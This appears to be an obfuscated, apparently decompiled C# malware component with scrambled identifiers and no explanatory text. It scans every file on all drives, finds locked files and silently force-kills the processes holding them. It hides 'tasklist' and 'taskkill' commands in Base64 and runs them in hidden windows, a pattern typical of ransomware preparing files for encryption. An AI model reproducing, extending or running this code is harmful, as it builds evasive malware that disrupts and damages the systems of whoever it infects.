using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Text;

namespace oiBbJupDERGF;

internal class fUntioFZxUccTJ
{
	[CompilerGenerated]
	private sealed class JCovcbCOgTS
	{
		public string EGsbXtXbsfhsL;

		public bool _003CKillproc_003Eb__4(string t)
		{
			return t.Contains(EGsbXtXbsfhsL);
		}
	}

	public static readonly List<string> lvxlvLboXcpd = new List<string>();

	public static readonly List<string> CpDnGTIuGs = new List<string>();

	public static void DsafapajlicOPTi()
	{
		try
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				if (driveInfo.IsReady)
				{
					MtHcVXoQWhyn(driveInfo.Name);
				}
			}
		}
		catch (Exception)
		{
		}
	}

	public static void MtHcVXoQWhyn(string ZwKgulFdJabo)
	{
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(ZwKgulFdJabo);
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				try
				{
					lvxlvLboXcpd.Add(fileInfo.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
			DirectoryInfo[] directories = directoryInfo.GetDirectories();
			foreach (DirectoryInfo directoryInfo2 in directories)
			{
				try
				{
					MtHcVXoQWhyn(directoryInfo2.FullName);
				}
				catch (UnauthorizedAccessException)
				{
				}
			}
		}
		catch
		{
		}
		if (lvxlvLboXcpd.Count <= 0)
		{
			return;
		}
		foreach (string item in lvxlvLboXcpd.Where((string gTCZHSjpOFHaq) => rLChhkpyhfyR(gTCZHSjpOFHaq)))
		{
			CpDnGTIuGs.Add(item);
		}
		lvxlvLboXcpd.Clear();
		if (CpDnGTIuGs.Count <= 0)
		{
			return;
		}
		foreach (FileInfo item2 in CpDnGTIuGs.Select((string pASiDYQLKG) => new FileInfo(pASiDYQLKG)))
		{
			iXWtLKmWQkpHu(item2.Name);
		}
	}

	public static bool rLChhkpyhfyR(string ggObSLFZtUTy)
	{
		FileStream fileStream = null;
		try
		{
			fileStream = File.Open(ggObSLFZtUTy, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
		}
		catch (UnauthorizedAccessException)
		{
			try
			{
				fileStream = File.Open(ggObSLFZtUTy, FileMode.Open, FileAccess.Read, FileShare.None);
			}
			catch (Exception)
			{
				return true;
			}
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream.Close();
		}
		return false;
	}

	public static void iXWtLKmWQkpHu(string VPzUCLmYTqK)
	{
		try
		{
			string text = rGSOZNONKtkfQU(IkMjOMZbHrXB.ASyAXFKNbugHZ("dGFza2xpc3Q="), IkMjOMZbHrXB.ASyAXFKNbugHZ("L3YgL2ZvIGNzdg=="));
			string[] separator = new string[1] { "\r\n" };
			string[] source = text.Split(separator, StringSplitOptions.None);
			List<string> list = (from t in source
				where t.Contains(VPzUCLmYTqK)
				select t into zasRnhfvfuqh
				select zasRnhfvfuqh.Split(new char[1] { ',' }) into fBzdfjavwhGzfzJ
				select fBzdfjavwhGzfzJ[1].Replace("\"", "")).ToList();
			foreach (string item in list)
			{
				rGSOZNONKtkfQU(IkMjOMZbHrXB.ASyAXFKNbugHZ("dGFza2tpbGw="), IkMjOMZbHrXB.ASyAXFKNbugHZ("L2YgL3BpZCA=") + item);
			}
		}
		catch (Exception)
		{
		}
	}

	public static string rGSOZNONKtkfQU(string ynuQlVePYDR, string FAXkNitkRLM)
	{
		try
		{
			ProcessStartInfo processStartInfo = new ProcessStartInfo(ynuQlVePYDR, FAXkNitkRLM);
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.RedirectStandardError = true;
			processStartInfo.StandardOutputEncoding = Encoding.GetEncoding("UTF-8");
			processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			Process process = Process.Start(processStartInfo);
			string text;
			using (StreamReader streamReader = process.StandardOutput)
			{
				text = streamReader.ReadToEnd();
			}
			string text2;
			using (StreamReader streamReader2 = process.StandardError)
			{
				text2 = streamReader2.ReadToEnd();
			}
			process.WaitForExit();
			return text2 + text;
		}
		catch (Exception ex)
		{
			return ex.Message + "\n<------------>\n" + ex.StackTrace;
		}
	}
}
